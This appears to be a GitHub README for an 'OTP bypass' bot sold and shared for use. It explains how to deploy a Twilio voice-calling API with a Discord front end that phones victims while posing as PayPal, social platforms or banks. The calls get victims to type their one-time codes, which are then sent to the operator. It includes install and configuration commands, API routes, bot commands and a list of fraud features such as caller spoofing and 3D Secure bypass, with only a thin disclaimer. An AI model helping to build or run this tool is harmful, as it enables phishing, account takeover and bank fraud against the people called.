# Otp-Sms-Bot-V-2
The Advanced Version of Otp Sms Bypass v 1 is V 2. Bot is actually a software coded by a person named Ross. I developed a little bit on it and turned it into a perfect bot.
The purpose of using and sharing this Bot is completely under the responsibility of the person. I do not accept any responsibility.
System Requirement: 
NodeJs : https://nodejs.org/en/download/
Twilio API: https://www.twilio.com/

I'm Sharing because V 3 of this Bot is live now. If you have any questions about the bot, feel free to ask.

Features of the bot.
1-)Full language pack
2-)4 ,5,6 and 8 digit otp modules
3-)Search Custom by entering name and company name
4-)Ability to call without changing the configuration file with the number registered in Twillio
5-)Authorize the user you want with the Discord Bot
6-)Seeing every number entered online after a call
7-)Search with audio copies of all social media platforms
8-)Making calls with all bank voices of the world
9-)Supports calling all Banks of the world
10-)If you want, you can make a call with the number of the country you want to call.
11-)Ability to hide calls by creating an Incognito Script
12-)Adding the audio file you want for calls effortlessly
13-)Dozens more features that we can't count yet.
14-)Enjoying the 1-time update opportunity for free
15-)Happy :Those who bought the boat before. you have an update. System-specific 5-digit code can now be obtained

-------------------------------------------------------------------------------------------------------------------------------------
API
The API requests availables & working :

/call with POST DATA :

to: theClientPhoneNumber
user: theUser
service: theUsedService
name: theNameOfTheUser
password: yourApiPassword
/get with POST DATA :

callSid: theCallSid
password: yourApiPassword
/stream/service with GET DATA :

service: theServiceNameYouWannaUse
/voice/password with POST DATA :

password: yourApiPassword
callSid: theCallSid
Digits: theDigitsEnteredByTheUSer (not required)
Bot Commands
All the Admin commands :

!user add @user : allow someone to use the bot & the calls
!user delete @user : remove someone or an admin from the bot
!user info @user : get infos from a user
!user setadmin @user : set a user to admin
All the Users commands :

!secret yoursecretpassword @user : set a user to admin without been admin
!call phonenumber service or for example !call 33612345678 paypal : call the phonenumber using the bot and get the sms code
The differents call services supported :

Paypal
Google
Snapchat
Instagram
Facebook
Whatsapp
Twitter
Amazon
Cdiscount
Default : work for all the systems
Banque : bypass 3D Secure
How it works ?
When you do a !call 3312345678 paypal, the Discord Bot sends a post request to our private api, who is gonna save the call into our sqlite DB and send the call to our twilio API.
The Twilio API use our /status route to know what to do in the call, the status route returns TwiML code to Twilio.
The /status route returns the self hosted service song using the /stream/service route.
If the user enter the digit code using the numpad, the song stops, it thanks him for the code, and end the call.
The /status route send the code to your discord channel using a webhook.
Prerequisite
Node.js & NPM from the last version.
git installed (not necessarily)
Open ports
A twilio account
A discord account (if you use the bot)
Install the API
Download the API Files from the github

git clone https://github.com/Ross1337/SMSBotBypass.git

Go to our API folder

cd /SMSBotBypass/api/

Install the dependencies

npm i

Start the api, wait 15s, and then, stop it

npm start

Modify the config.js file

Add your twilio AccountSid & AuthToken
Your twilio caller id
Your actual IP to run the web server
Open the port 1337

To check if everything works fine, I did a full test system. If your Twilio account is not upgrade, before the test, go to the /test/call.js file and modify the phone number line 122 with your phone numer.

npm test

![testing](https://user-images.githubusercontent.com/92768020/194468854-925a7f9a-405a-4ba7-937d-365f86567804.png)

Your private API now works !

Be carefull, you also need to change the TTS Language, go to https://www.twilio.com/console/voice/twiml/text-to-speech and change the TTS Language from English to French with the Lea voice.

Install the Discord Bot
Take your API Password from you config.js file in your api folder we are gonna use it

cd ../bots/discord

Modify the config.js file

Add API Url & Api Password
Your discord bot token
Your actual IP to run the web server
Change the secret password
Create two discord roles, one "Admin" with Administrator permissions, and the other one "Bot User" with any permission.

Add the bot to the discord server

Initialize the discord bot

npm i

You can now start the discord bot

node bot.js

You can get all the informations neeeded on discord doing !help

![11](https://user-images.githubusercontent.com/92768020/194468962-96d0801d-5c56-4da1-b4af-1defeb0e56d4.png)

![22](https://user-images.githubusercontent.com/92768020/194469005-c62514ed-18f1-475e-bde2-ca593cc6e9c5.png)

![33](https://user-images.githubusercontent.com/92768020/194469026-82c4b074-fb45-437c-8e26-9dda93b0b94d.png)

Disclaimer
This code is only a POC code, do not use it illegally. You could been arrested to use badly this code. Only use it with your phone numbers or people who accept to test this code.

Contributions
Feel free to contribute to this project by fork and pull request this repo!
